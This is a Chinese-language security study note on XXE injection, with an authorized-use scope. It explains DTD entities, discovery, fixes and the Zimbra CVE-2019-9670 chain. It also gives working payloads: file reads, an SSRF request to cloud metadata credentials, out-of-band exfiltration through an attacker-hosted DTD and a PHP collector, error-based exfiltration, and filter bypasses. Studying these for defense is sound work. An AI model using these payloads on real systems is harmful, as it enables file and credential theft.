---
tags: [网络安全, WEB攻防, XXE, XML外部实体, 文件读取, SSRF]
---

# XXE 外部实体注入 —— 从 DTD 机制到无回显外带

> [!info] 🧭 知识导航
> 上级：[[MOC - 小迪网课漏洞学习]] ｜ 首页：[[🏠 知识库首页]]
> 🔗 相关：[[02_任意文件下载漏洞-原理与利用全集]] · [[03_SSRF服务端请求伪造完整笔记]] · [[00_文件上传漏洞-原理与绕过全集]] · [[00_路径穿越漏洞详解]] · [[06_PHP文件相关操作安全笔记]] · [[SRC漏洞挖掘经验-老手如何一眼看出重点]]

> 一句话总结：XML 允许用 **DTD 定义一个"实体"**，实体的值可以是**外部 URI**；解析器遇到 `&xxe;` 就会去把那个 URI 的内容**取回来填进去**——于是你让它取 `file:///etc/passwd` 就是**任意文件读取**，让它取 `http://内网IP/` 就是 **SSRF**，取不回来（无回显）时就用**带外通道（DNS/HTTP）**把数据偷出来。
> 来源：小迪安全课程（XXE 部分）+ 本机 PHP 7.3.4 实测（§1.4）+ 联网核实（MITRE/NVD、Rapid7 Metasploit 模块，非大陆来源）。
> 适用前提：仅限授权环境、靶场、CTF、书面授权范围。带外请求会打到你自己控制的域名，别用真实第三方域名做测试。
>
> 📊 **本篇整体定级：🟡 重要**。XXE 不算"天天遇到"，但**一旦遇到基本就是高危**（读配置/凭据、打内网、打云元数据），而且在 Java/.NET 老系统、SOAP 接口、文档解析功能里命中率不低。分级重点：**DTD 机制**和**无回显外带**是 🔴（不懂这两块，payload 只能照抄）；具体 payload 变体和载体清单 🟡/🟢，用到再查。
> 分级图例：🔴 核心 ｜ 🟡 重要 ｜ 🟢 了解 ｜ ⚪ 扫过

---

## 0. 先看这张地图

| 知识点 | 分级 | 在渗透流程中的位置 | 一句话作用 |
|---|---|---|---|
| XML / DTD / 实体的机制 | 🔴 核心 | 漏洞利用（地基） | 所有 payload 都由这套语法拼出来，不懂就只会抄 |
| 为什么会存在（root cause） | 🔴 核心 | 漏洞发现 | 判断"这个解析器会不会去取外部资源" |
| 危害分类：读 / SSRF / DoS / 命令执行（真相） | 🟡 重要 | 漏洞利用 | 别把 XXE 一律说成"能 RCE" |
| 黑盒发现：三类入口 | 🟡 重要 | 信息收集 | 知道去哪找 XML 解析点 |
| 白盒发现：函数清单 | 🟡 重要 | 代码审计 | 拿到源码几分钟定位危险解析 |
| 有回显利用（读文件 / 打元数据） | 🟡 重要 | 漏洞利用 | 最简单的一半，照结构改即可 |
| 无回显利用（OOB / 外部 DTD / 错误外带） | 🔴 核心 | 漏洞利用 | 真正拉开差距的部分 |
| 进阶载体：XInclude / SVG / docx / SOAP | 🟡 重要 | 漏洞发现 | 入口不只"请求体"，文件也算 |
| 修复与检测 | 🟡 重要 | 复测 | 知道正确修法，才看得出对方修得对不对 |
| Billion Laughs（实体膨胀 DoS） | ⚪ 扫过 | —— | 知道名字即可，现代解析器多有保护 |

**建议阅读顺序**：§1（机制，必须懂）→ §6（无回显，本篇核心）→ §5（有回显）→ §3（黑盒找点）→ §7（进阶入口）→ §8 修复。

**前置知识**：
- **"数据越界成指令"这个共同根因**——详见 [[01_文件包含漏洞-原理与利用全集]] §1.2（XXE 是同一个根，只是载体换成了 XML）。
- **SSRF 的探测与利用**——详见 [[03_SSRF服务端请求伪造完整笔记]]，XXE→SSRF 是它的一个触发器。
- **文件上传后服务端会解析文件**——详见 [[00_文件上传漏洞-原理与绕过全集]] §0.1。

---

## 1. 先搞懂 XML / DTD / 实体 🔴 核心 —— 这是所有 payload 的地基

### 1.1 XML 与 HTML 的分工差异 🟢 了解

| | XML | HTML |
|---|---|---|
| 目的 | **传输 / 存储**数据 | **显示**数据 |
| 焦点 | 数据的内容 | 数据的外观 |
| 标签 | 自己定义（`<stockCheck>`） | 预定义（`<div>`） |
| 严格性 | 必须良构，否则解析失败 | 浏览器容错极强 |

一句话：**HTML 是给浏览器看的，XML 是给程序读的**——所以"程序怎么读 XML"，就是 XXE 的全部战场。

### 1.2 DTD 与四种实体（必须分清）

XML 允许在文档里写一段 **DTD（Document Type Definition，文档类型定义）**，用声明语法定义"实体"。实体就是**可以被引用的变量**：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE 根元素 [
  <!ENTITY 内部实体 "固定字符串">                          <!-- ① 内部实体 -->
  <!ENTITY 外部实体 SYSTEM "file:///etc/passwd">           <!-- ② 外部实体：值是 URI -->
  <!ENTITY % 参数实体 "只在 DTD 内部用">                   <!-- ③ 参数实体：带 % 号 -->
]>
<根元素>&内部实体; &外部实体; %参数实体;</根元素>
```

四类实体，各自的关键差异：

| 类型 | 声明写法 | 引用写法 | 用在哪 |
|---|---|---|---|
| **内部实体** | `<!ENTITY a "text">` | `&a;` | 文档正文 |
| **外部实体** | `<!ENTITY a SYSTEM "URI">` | `&a;` | 文档正文；**值是 URI，解析器会去取** |
| **参数实体** | `<!ENTITY % a "text">` | `%a;` | **只能在 DTD 内部**引用，正文里不能用 |
| **外部 DTD** | `<!DOCTYPE r SYSTEM "http://x/x.dtd">` 或 `<!ENTITY % d SYSTEM "...">` | `%d;` | 把整段 DTD 放到别人服务器上 |

> 类比：**DTD 像"这份文档的变量表"，`SYSTEM` 像"这个变量的值去这个地址取"。** 开发者只把它当"格式化声明"用，没意识到"取值"是一次**真正的网络/文件访问**——这就是漏洞的入口。

**一条必须记住的规范限制（所有"三层 DTD"payload 的来源）**：
> **在内部 DTD 子集里，参数实体不能出现在标记声明内部**（XML 规范 *PEs in Internal Subset*）。
> 也就是说，下面这种"直接外带"在内联写法里是**非法的、解析会失败**：
> ```xml
> <!ENTITY % file SYSTEM "file:///etc/passwd">
> <!ENTITY send SYSTEM "http://attacker/?d=%file;">   <!-- ❌ 参数实体被用在了实体值里 -->
> ```
> 解法：把 `send` 的定义**搬到外部 DTD**（由目标去拉你的 `.dtd` 文件），因为外部 DTD 里这条限制不成立。**这就是 §6.2 那个三段式 payload 存在的原因。**

### 1.3 为什么会存在（root cause）

**正常设计意图**：XML 是"跨系统交换数据"的格式，现实中确实有"文档片段放在别的文件里、由 DTD 引进来"的需求，所以规范允许**外部实体**。

**问题出在哪**：
1. 解析器默认把 `SYSTEM` 的 URI 当成"可信的、由开发者写的常量"；
2. 但 DTD 整段都来自**用户提交的 XML**——攻击者可以自己写 `<!ENTITY xxe SYSTEM "file:///etc/passwd">`；
3. 解析器忠实地**去取**这个 URI，并把结果**替换进文档**，还经常**顺着业务逻辑回显给用户**。

**root cause 一句话**：**解析器把"文档里写的外部引用"当成了可信指令去执行（取资源），而这段文档是攻击者可控的数据**——又是"数据越界成指令"，只是这次的载体是 XML 的 DTD。

### 1.4 一条实测结论：为什么 PHP 站点的 XXE 比 Java 少 🟡 重要

> [!note] 🔎 补充（非原笔记内容）+ 实测：本机 PHP 7.3.4 / libxml 2.9.9
> 我把同一个 payload（`<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` + `&xxe;`）喂给 PHP 的两种解析方式，结果差别很大：
>
> | 写法 | 结果 |
> |---|---|
> | `simplexml_load_string($xml)`（默认，不传选项） | 实体**不展开**，取到空字符串 |
> | `simplexml_load_string($xml, 'SimpleXMLElement', **LIBXML_NOENT**)` | ✅ **成功读出 win.ini 内容** |
> | `new DOMDocument(); loadXML($xml)`（默认） | 实体不展开 |
> | `loadXML($xml, **LIBXML_NOENT**)` | ✅ 成功读出内容 |
>
> **结论**：在 PHP 里，XXE 成立的关键条件是**代码在解析时启用了实体替换**（`LIBXML_NOENT`；DOM 侧对应 `substituteEntities=true` / `resolveExternals=true`）。**绝大多数业务代码不会传这个参数**，所以 PHP 的 XXE 少；而 Java/.NET 的一些默认配置反而会去解析外部实体，命中率更高。
> **对你的意义**：① 拿到 PHP 站点先看它是不是"老代码/特殊中间件"（如某些 XML 解析库、SOAP），别默认"PHP 就一定有 XXE"；② 反过来，Java 老系统、SOAP/RSS/文档转换这类功能要优先怀疑。

---

## 2. 危害分类 🟡 重要 —— 别说"XXE 就是 RCE"

| 危害 | 机制 | 真实频度 |
|---|---|---|
| **任意文件读取** | 实体取 `file://` | 高（最常见、最稳） |
| **SSRF / 打内网 / 打云元数据** | 实体取 `http://内部地址`，服务端替你去请求 | 高 |
| **内网端口探测** | 用不同端口/路径的响应差异（成功/失败、耗时）判断开放 | 中 |
| **拒绝服务（Billion Laughs）** | 实体嵌套自引用，指数级膨胀 | 低（现代解析器多有上限保护）→ ⚪ 扫过 |
| **命令执行** | **XXE 本身不能执行命令**；只有 PHP 加载了 `expect` 扩展时可用 `expect://id`（默认没有），或像 Zimbra 那样"读配置拿凭据 → 打另一个洞 → RCE" | 低，且几乎都是**组合链** |

> ⚠️ **纠正常见说法**：课程/资料里常写"XXE 可造成命令执行"。准确说法是：**XXE 是"读文件 + 发请求"的原语**，RCE 需要 `expect://`（罕见）或与其他漏洞组合（§9 的 Zimbra 就是组合）。报告里把"能读什么"写清楚，比含糊写"可 RCE"更有说服力。

---

## 3. 黑盒发现：三类入口 🟡 重要

### 3.1 入口一：请求就是 XML

- **线索**：`Content-Type: application/xml` 或 `text/xml`；body 以 `<?xml` 开头；SOAP 请求（`<soapenv:Envelope>`）。
- **做法**：在原 XML 里插一个 `<!DOCTYPE ...>` 和一个自定义实体，找一个会被回显的字段填 `&xxe;`。
- **前提**：**`<!DOCTYPE>` 要放在 `<?xml ...?>` 声明之后、根元素之前**——位置错了直接解析失败，这是新手最常犯的错。

### 3.2 入口二：请求不是 XML，但你硬改

- 表单、JSON 提交的接口，把 `Content-Type` 改成 `application/xml`、body 换成 XML，看服务端是**报错**、**正常处理**还是**忽略**。
- **判读**：如果返回结构/字段和原来一致，说明后端可能用同一套解析（如 Spring 的内容协商、PHP 的 `php://input` 自动解析）→ 值得继续；如果报 415/400 就说明它只吃原来的格式。

### 3.3 入口三：文件里藏 XML（最容易漏）

**很多功能"收到文件 → 服务端解析"**，文件本身是 XML 格式：

| 载体 | 为什么算 XML | 触发点 |
|---|---|---|
| **SVG** 图片 | 本身就是 XML | 上传后服务端**渲染/转 PNG/取尺寸/清理**时解析 |
| **DOCX / XLSX / PPTX** | 是 zip 包，里面是 `document.xml` 等 XML | 上传后**转 PDF、提取文本、预览、加水印** |
| **XML 配置文件导入** | 备份恢复、批量导入 | 直接解析 |
| **RSS / Atom 订阅** | XML 提要 | 服务端"抓取订阅源"时解析 |
| **SOAP / WSDL 客户端** | XML 报文 | 任何对接第三方接口的功能 |
| **XMP / 元数据解析**（图片 EXIF、PDF XMP） | 内嵌 XML | 上传后读元数据 |

> 💡 **这是本篇最该记住的黑盒思路**：**"服务端会解析 XML"的地方，都是 XXE 的入口**——不只是 API 请求体。上传功能配合文档转换（Word→PDF、图片→缩略图）是最常见的隐藏入口，也和 [[00_文件上传漏洞-原理与绕过全集]] 里的"二次处理组件"是同一类攻击面。

### 3.4 第一步该做什么：先测"能不能出网"，再读文件

实战顺序（比直接读 `/etc/passwd` 高效得多）：

```
① 塞一个指向你控制的域名/DNS 日志的实体（§6.1）
   → 有 DNS 命中 = 外部实体确实被解析、目标能出网 → 后面全通
   → 没命中 = 要么不解析外部实体，要么出网被封（换 file:// 再确认一次）
② 再用 file:// 读一个确定存在的文件（/etc/passwd 或 C:\Windows\win.ini）
③ 读到了 → 直接上"读配置/凭据"（见 02 篇 §4.1 的清单）
```

---

## 4. 白盒发现：搜什么函数 🟡 重要

| 语言 | 危险点（会解析 XML 的 API） | 备注 |
|---|---|---|
| **PHP** | `simplexml_load_string` / `simplexml_load_file`、`DOMDocument::loadXML`、`XMLReader::open`、`SoapClient`、`SimpleXMLElement`、`xml_parse` | 注意是否传了 `LIBXML_NOENT`（§1.4） |
| **Java** | `DocumentBuilderFactory`、`SAXParserFactory`、`SAXReader`(dom4j)、`XMLReader`、`Unmarshaller`(JAXB)、`TransformerFactory`、`XmlMapper`(Jackson XML) | **Java 是重灾区**，默认配置常不禁止 DTD |
| **.NET** | `XmlDocument.Load`、`XmlReader.Create`（注意 `XmlResolver`）、`XmlSerializer`、`XmlTextReader` | `XmlResolver` 不为 null 就可能拉取外部资源 |
| **Python** | `lxml.etree.parse/fromstring`（**老版本默认会解析外部实体**）、`xml.sax`、`xml.dom.minidom` | `defusedxml` 是官方推荐的加固库；标准库 `ElementTree` 默认安全 |
| **Node.js** | `libxmljs`、`xml2js`（默认不展开实体）、`fast-xml-parser` | 看有没有显式开启实体解析 |

**三条白盒路径**（和文件包含一样）：
1. **功能追踪**：从"导入/导出、文档转换、订阅、SOAP 对接"追到解析代码；
2. **函数搜索**：直接全局搜上表 API，看参数来源；
3. **伪协议/绕过审计**：看到"过滤了 `<!DOCTYPE`"就想"能不能编码/分片/换参数实体"（§8 会讲为什么过滤不彻底）。

---

## 5. 有回显利用（最简单的一半）🟡 重要 —— 会用模板就行

### 5.1 读文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**逐段拆解**：

| 片段 | 作用 | 为什么需要 |
|---|---|---|
| `<?xml version="1.0"?>` | XML 声明 | 必须第一行；`<!DOCTYPE>` 放它后面 |
| `<!DOCTYPE test [ ... ]>` | 内部 DTD 子集 | 只能在这里声明实体 |
| `<!ENTITY xxe SYSTEM "file:///..."` | 定义外部实体 | `SYSTEM` = 值是 URI，解析器会去取 |
| `&xxe;` | 引用实体 | **放在会被回显的字段里**，否则你拿不到内容 |
| 外层业务标签 | 保持原报文结构 | 结构错了服务端可能直接拒绝，到不了解析 |

> **环境前提**：解析器启用了实体展开（PHP 需 `LIBXML_NOENT`，见 §1.4；Java/.NET 多数默认会）；`file://` 目标文件**可被 Web 进程读**。
> **失败最常见原因**：① `<!DOCTYPE>` 位置放错 → 解析失败；② 实体引用没落在回显字段里 → 取到了但你看不到；③ 目标文件权限不够（如 `/etc/shadow`）；④ 解析器禁了外部实体（§8）。

### 5.2 SSRF：打内网与云元数据

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

- **`169.254.169.254`** 是云厂商的元数据服务地址；能读到它，往往意味着**拿到了云上临时凭据**。
- 🔎 补充（非原笔记内容）：**不要默认"XXE 打元数据一定成功"**——AWS 启用 IMDSv2 后需要先 `PUT` 拿 token 再 `GET`（XXE 的 GET 拿不到），GCP 要求带 `Metadata-Flavor: Google` 头（XXE 无法自定义请求头），**Azure 的 GET 方式一般可行**。具体以目标云厂商文档与现场响应为准，写在"待核实"里更稳。
- 内网探测的用法：把实体指向 `http://10.0.0.5:6379/`、`http://internal-host/`，用**响应差异或耗时**判断端口/主机是否存在。

---

## 6. 无回显利用 🔴 核心 —— 真正的技术含量在这

**前提**：服务端解析了实体、也真的去取了资源，但**结果不回显**（接口只返回"成功/失败"）。此时要把数据**主动送到你能看到的地方**（带外，OOB）。

### 6.1 第一步永远先测 DNS（成本最低）

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "http://你的子域名.你的DNS日志服务/">
  %file;
]>
<user><username>&send;</username><password>x</password></user>
```

- 用 **Burp Collaborator / dnslog / interactsh** 之类的带外平台，命中了就说明：**外部实体被解析 + 目标能出网**。
- 这一步只是"通不通"，**不带文件内容**——先确认通道，再谈偷数据。

### 6.2 外部 DTD 外带（三段式，必须这么写）

**为什么必须三段**：§1.2 那条规范限制——**在内部子集里，参数实体不能用于实体值**。所以 `send` 的定义必须搬到你自己服务器上的 `.dtd` 里。

**① 发给目标的 XML**（只做两件事：拉我的 DTD、引用 `send`）：

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % remote SYSTEM "http://你的服务器/x.dtd">
    %remote;
    %all;
]>
<user><username>&send;</username><password>x</password></user>
```

**② 你服务器上的 `x.dtd`**（在这里定义"引用文件内容"的实体）：

```dtd
<!ENTITY % file SYSTEM "file:///c:/c.txt">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://你的服务器/get.php?file=%file;'>">
```

**③ `get.php`**（把收到的内容落盘，方便回看；生产环境用带外平台更省事）：

```php
<?php
$data = $_GET['file'] ?? '';
file_put_contents("file.txt", $data . "\n", FILE_APPEND);
```

**执行流**：目标解析 ① → 去拉 ② → ② 里 `%all` 展开出 `send` → `&send;` 触发 → 请求 `get.php?file=<文件内容>` → 你在 `file.txt` 里看到数据。

> **要点**：`%remote;` 必须写在 `%all;` 之前（先加载 DTD，才能用里面定义的 `%all`）；`%all;` 与 `&send;` 的顺序错了会解析失败。

### 6.3 CDATA 包裹：读 XML 内容时的救命技巧 🟡 重要

直接外带**文件内容里含 `<`、`&`、换行**时（比如读的是 `localconfig.xml`、`config.php`），URL 会被这些字符搞坏，甚至让 DTD 解析失败。做法是**用 CDATA 把内容包起来**（这是 Zimbra 真实利用里的写法，见 §9）：

```dtd
<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://你的服务器/?d=%start;%file;%end;'>">
```

- 这样文件原文（哪怕含 `<`/`&`）都在 CDATA 段里，不会破坏 DTD 结构；你在服务端看到的是原样内容。
- **代价**：内容里如果本身含 `]]>` 会截断（少见，遇到时改用错误外带或分片读）。

### 6.4 错误解析外带（没有出网，但有报错回显）

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
  %eval;
  %exfil;
]>
```

- **机制**：让解析器去访问一个**非法路径**，路径里拼上文件内容 → 解析器报错 → **错误信息里带着文件内容**（前提：应用把 XML 解析错误回显给用户）。
- `&#x25;` 就是 `%`：用字符引用**延迟展开**参数实体，避开"内部子集里不能直接用"的限制。
- **失败常见原因**：应用吞掉了错误只返回"500"；或错误信息被脱敏（只显示 generic error）。

### 6.5 无回显三种手法怎么选

| 条件 | 首选 |
|---|---|
| 能出网 + 有带外平台 | **外部 DTD 外带**（§6.2，最稳，可带大文件） |
| 能出网、只想确认漏洞 | **DNS 探测**（§6.1） |
| 不能出网、但报错会回显 | **错误解析外带**（§6.4） |
| 都不能 | 只能读**能被回显**的字段（§5），或放弃并记录"存在 XXE 但无外带通道" |

---

## 7. 进阶载体与入口 🟡 重要

### 7.1 XInclude：不能改 DTD 但能改内容时

有些应用把你的参数**嵌进一份服务端写好的 XML 里再解析**——你没法插 `<!DOCTYPE>`，但可以插 `xi:include`：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- **前提**：解析器开启了 XInclude 支持（`setXIncludeAware(true)` / `libxml` 的 `XINCLUDE`）。
- **判据**：你插入的普通标签（如 `<a>1</a>`）能原样出现在服务端响应里 → 说明"内容被嵌进 XML 解析了" → 值得试 XInclude。

### 7.2 SVG 图片

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

- 上传后若服务端**渲染/生成缩略图/转格式**，就会解析这段 XML；回显方式看业务（有时生成的图片里就有内容）。
- 现在很多站点**禁止上传 SVG**，但"上传后转 PNG"的老图片服务仍有。

### 7.3 DOCX / XLSX 等 Office 文档

- 本质是 zip：`word/document.xml`、`sharedStrings.xml` 等；把带实体的 XML 打进去，重新打包上传。
- **触发点在服务端**：转 PDF、提取文字、水印、预览、杀毒扫描（有些扫描器自己就解析 XML）。
- 🔎 补充（非原笔记内容）：这条链的难点是"重新打包后 zip 结构/关系文件要对"，否则上传就被拒；实操时建议先在本地用 LibreOffice 打开确认文档没坏，再上传。

### 7.4 其他值得一试的地方（🟢 了解）

SOAP/REST/RPC 接口、XML 导入导出、RSS/Atom 订阅、文档查看器/转换器、XML 格式的配置恢复、以及任何"上传后服务端要解析"的功能。

---

## 8. 修复与检测 🟡 重要 —— 顺便纠正两处常见写法

### 8.1 正确修法（按语言）

| 语言 | 正确做法 | 说明 |
|---|---|---|
| **PHP** | **不要传 `LIBXML_NOENT`**；`LIBXML_NONET` 禁止网络；升级 libxml | 原文的 `libxml_disable_entity_loader(true)`：**PHP 8.0 起该函数已废弃**，且 libxml 2.9+ 默认不展开实体（§1.4 实测印证）。它现在更多是"心里安慰" |
| **Java** | `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`（最彻底）；或同时关 `external-general-entities` / `external-parameter-entities` / `load-external-dtd`，并 `setXIncludeAware(false)` | 原文只写 `setExpandEntityReferences(false)` **不够**：它只影响"引用是否展开"，部分解析器仍会去拉外部 DTD |
| **.NET** | `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }` | 关键是 `XmlResolver = null` |
| **Python** | `lxml`：`resolve_entities=False` + `no_network=True` + `load_dtd=False`；生产建议直接用 `defusedxml` | 原文的 `resolve_entities=False` 方向对，但不完整 |
| **通用** | 业务上不需要 DTD 的解析器，**一律禁止 DOCTYPE** | 90% 的业务 XML 根本用不到 DTD |

### 8.2 为什么"过滤关键词"不彻底

原文方案 2：过滤 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC`。这是**黑名单**，绕过方式一串：

- 大小写、注释插入（`<!-` `-` `-ENTITY`）、`&#x3C;!ENTITY` 之类的字符引用（部分解析器会先解码再解析）；
- 参数实体经**外部 DTD** 引入（你过滤的是"用户输入里的字符串"，DTD 在别人服务器上）；
- 编码/分片、`utf-16` 提交（过滤器按 ascii 找关键字会漏）。

> **结论**：过滤只能当"缓解"，**真正的修法是关掉 DTD/外部实体**（§8.1）。复测时看到"加了个关键词过滤"就说明它大概率还能绕。

---

## 9. 案例锚点：一次 XXE 怎么走到 RCE

> **CVE-2019-9670（Zimbra Collaboration Suite XXE）**——已核实（MITRE CVE 记录 2019-05-29；NVD 显示其被列入 CISA 已知被利用目录，2022-01-10；Rapid7 Metasploit 模块描述）
> **发生了什么**：Zimbra 8.7.x（8.5–8.7.11 均受影响）的 `mailboxd` 组件在 `/Autodiscover/Autodiscover.xml` 处存在 XXE。攻击者无需登录，用一条带外部实体的 Autodiscover 请求读取 `/opt/zimbra/conf/localconfig.xml`，拿到 `zimbra` 账号的 **LDAP 口令**；随后用该口令换到用户 cookie，再借 ProxyServlet 的 SSRF（CVE-2019-9621）打到管理端口拿到管理员 cookie，最后通过 Client Upload 上传 JSP WebShell → **命令执行**。
> **根因对应本篇哪一环**：§5/§6 的"外部实体读本地文件"——`SYSTEM "file://..."` 被解析器忠实执行；外带时用了 **CDATA 包裹**（§6.3），因为读的是 XML 配置文件。
> **业务后果**：邮件系统（含全部邮件、账号、通讯录）被完全接管；这是"XXE 只是读个文件"到"整台服务器失守"的标准示范。
> **对你的启发**：① **XXE 的价值来自"读到了什么"**——读 `localconfig.xml` 等于读到凭据，比读 `/etc/passwd` 值钱一个数量级；② 报告里写清"读了哪个配置、里面有什么凭据、由此能做什么"，定级自然上去；③ 读 XML/配置文件时记得用 §6.3 的 CDATA 技巧，否则外带会被内容里的 `<`/`&` 打断。

---

## 10. 把它串起来

**先用 5 条复述出骨架**：

1. **机制**：DTD 里用 `SYSTEM` 定义的实体，值是 URI，解析器会**去取**并填入（§1.2）。
2. **成立条件**：解析器允许解析外部实体（PHP 要 `LIBXML_NOENT`，Java/.NET 常默认允许）——这是先要确认的（§1.4）。
3. **两类入口**：请求体是 XML / 文件是 XML（SVG、DOCX、订阅源、导入导出）（§3）。
4. **有回显**：把 `&xxe;` 塞进会被回显的字段，读 `file://`、打 `http://` 内网与元数据（§5）。
5. **无回显**：先 DNS 测通道，再"外部 DTD + CDATA"把内容带到自己的服务器，或错误外带（§6）。

```
① 找到会解析 XML 的点（§3：请求体 / 上传解析 / 导入导出 / SOAP）
        ↓
② 先测通道：塞指向自己 DNS 日志的实体 → 有没有命中？（§6.1）
        ↓ 有
③ 读已知文件：file:///etc/passwd 或 C:\Windows\win.ini（§5.1）
        ↓ 回显就结束，不回显走下面
④ 无回显：外部 DTD 三段式 + CDATA（§6.2 / §6.3）；不能出网 → 错误外带（§6.4）
        ↓
⑤ 读值钱的东西：配置 / 凭据 / 元数据凭据（§9 的 Zimbra 思路）
        ↓
⑥ 报告：写清"读了什么 → 里面有什么 → 能做什么"，别只写"存在 XXE"
```

---

## 11. 自测（先自己想，再看答案）

1. 为什么"在内部 DTD 子集里直接写 `<!ENTITY send SYSTEM "http://x/?d=%file;">`"会失败？正确做法是什么？
2. 你的 XXE 洞能读文件，但接口只返回 `{"status":"ok"}`。列出你会依次尝试的三种外带方式，并说明各自的成立条件。
3. 读一个含 `<`、`&` 的 XML 配置文件时，直接外带为什么会坏？怎么解决？
4. 用户笔记给的 Java 修复 `dbf.setExpandEntityReferences(false)` 为什么不够？你会怎么改？
5. 一个站点声称"我们已过滤 `<!DOCTYPE` 和 `SYSTEM`"，这条防御能挡住哪些、挡不住哪些？

<details>
<summary>参考答案</summary>

1. 因为 XML 规范限制：**参数实体不能出现在内部 DTD 子集的标记声明内部**（PEs in Internal Subset），`%file;` 被用在 `<!ENTITY send ...>` 的值里属于非法。正确做法是把 `send` 的定义放到**外部 DTD**（目标去拉你的 `.dtd`），内部子集只留 `<!ENTITY % remote SYSTEM "...">` 和 `%remote; %all;`，这就是三段式 payload 的由来。
2. ① **DNS 探测**：实体指向自己的 DNS 日志/带外平台，条件是"能出网 + 会解析外部实体"，只确认漏洞不取数据；② **外部 DTD 外带**：需要能出网能访问你的 HTTP 服务，且能读文件，最稳、可带大文件；③ **错误解析外带**：需要"不能出网但应用回显解析错误"，把文件内容拼进非法路径触发报错。都不成立就只能找会被回显的字段，或记录"存在 XXE 但无通道"。
3. 文件内容里的 `<`、`&`、换行会破坏 URL 语法，甚至让 DTD 解析失败。解决：用 CDATA 包裹——在外带 URL 里拼 `<!ENTITY % start "<![CDATA[">` 和 `%end;`（`]]>`），把 `%file;` 夹在中间；内容里若出现 `]]>` 会提前截断，需要改用错误外带或分片读。
4. 因为 `setExpandEntityReferences(false)` 只控制"实体引用是否被展开成内容"，**并不能阻止解析器去加载外部 DTD/外部参数实体**（很多实现仍会发起请求）。正确做法是 `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` 直接禁掉 DOCTYPE；退一步至少同时关 `external-general-entities`、`external-parameter-entities`、`load-external-dtd`，并 `setXIncludeAware(false)`。
5. 能挡：直接提交、明文关键词的简单 payload（教学演示级）。挡不住：外部 DTD（关键词在你的服务器上，不在输入里）、字符引用/编码/大小写/注释插入、`utf-16` 等编码绕过、XInclude、以及走文件解析入口（SVG/DOCX）的载荷。所以它只是"缓解"，真正的修复是关闭 DTD 与外部实体。

</details>

---

## 12. 待核实 / 存疑

- **云元数据能否用 XXE 打**：AWS IMDSv2 需要先 `PUT` 取 token、GCP 需要 `Metadata-Flavor` 头，普通 XXE 的 GET 可能取不到；Azure 的 GET 一般可行。**以目标云厂商文档与现场响应为准**，我在本机无法验证真实云环境。
- **PHP 各版本默认值差异**：本机 7.3.4 / libxml 2.9.9 实测"不传 `LIBXML_NOENT` 就不展开实体"。PHP 8 起 `libxml_disable_entity_loader()` 已废弃，但**不同发行版构建的默认行为可能有差异**，以目标环境实测为准。
- **参数实体在内部子集失败的具体报错**：本机实测 `%p;` 指向非 DTD 内容（win.ini）时解析失败，属"内容不是合法 DTD"而非"禁止"；严格规范限制见 §1.2，但各解析器实现宽松度不同。
- **XInclude 与 DOCX 链条**：仅按公开资料与课程讲解整理，**未在本机跑通**（需要真实应用与文档转换组件）。
- **课程里"XXE 可命令执行"的说法**：已在 §2 按实际机制纠正（`expect://` 或组合链），若你的课程有具体环境，以环境为准。

## 13. 来源

- 原笔记：小迪安全课程（XXE 部分）。
- 实测：本机 `PHP 7.3.4 (NTS)` / libxml 2.9.9 上验证 SimpleXML 与 DOMDocument 在"传/不传 `LIBXML_NOENT`"两种情况下的外部实体行为（§1.4）。
- 核实（非大陆来源）：MITRE CVE 记录 `CVE-2019-9670`（2019-05-29）；NVD 该条目（含 CISA KEV 记录，2022-01-10）；Rapid7 Metasploit 模块 `zimbra_xxe_rce`（含 CDATA 版 DTD 写法）；ExtraHop 检测文档。
- 相关前置：[[01_文件包含漏洞-原理与利用全集]]（同根：数据越界成指令）、[[02_任意文件下载漏洞-原理与利用全集]]（读文件的价值判断）、[[03_SSRF服务端请求伪造完整笔记]]（XXE 是 SSRF 的触发器之一）、[[00_文件上传漏洞-原理与绕过全集]]（上传后解析的二次处理面）。
